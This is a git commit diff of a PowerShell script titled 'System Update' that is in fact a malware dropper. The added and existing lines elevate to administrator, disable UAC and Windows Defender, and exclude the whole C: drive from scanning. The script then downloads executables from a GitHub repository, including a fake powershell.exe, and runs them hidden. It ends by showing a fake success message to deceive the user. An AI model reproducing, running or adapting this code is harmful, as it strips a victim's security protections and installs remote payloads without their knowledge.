9f79b6127b0b8d271b7c22e9348cf1fa92d83d9a
system <siscord30@gmail.com>
2026-04-26 00:24:53 +0300

    123.ps1

--- 123.ps1
+++ 123.ps1
@@ -1,4 +1,9 @@
 $Host.UI.RawUI.WindowTitle = "System Update"
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`""
+    Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
+    Exit
+}
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
 Set-MpPreference -DisableRealtimeMonitoring $true -Force
@@ -8,7 +13,6 @@ Set-MpPreference -DisableIOAVProtection $true -Force
 Stop-Service -Name WinDefend -Force
 Set-Service -Name WinDefend -StartupType Disabled
 Add-MpPreference -ExclusionPath "C:\" -Force
-
 $urls = @(
     "https://github.com/sys1e/cmd/raw/refs/heads/main/Client.exe",
     "https://github.com/sys1e/cmd/raw/refs/heads/main/powershell.exe",
@@ -17,7 +21,13 @@ $urls = @(
 foreach ($url in $urls) {
     $fileName = $url.Split("/")[-1]
     $path = "$env:TEMP\$fileName"
-    Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
-    Add-MpPreference -ExclusionProcess $path -Force
-    Start-Process -FilePath $path -WindowStyle Hidden
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
+        Add-MpPreference -ExclusionProcess $path -Force
+        Start-Process -FilePath $path -WindowStyle Hidden
+    } catch {}
 }
+$Host.UI.RawUI.WindowTitle = "System Update"
+Clear-Host
+Write-Host "System Update completed successfully." -ForegroundColor Green
+Start-Sleep -Seconds 2
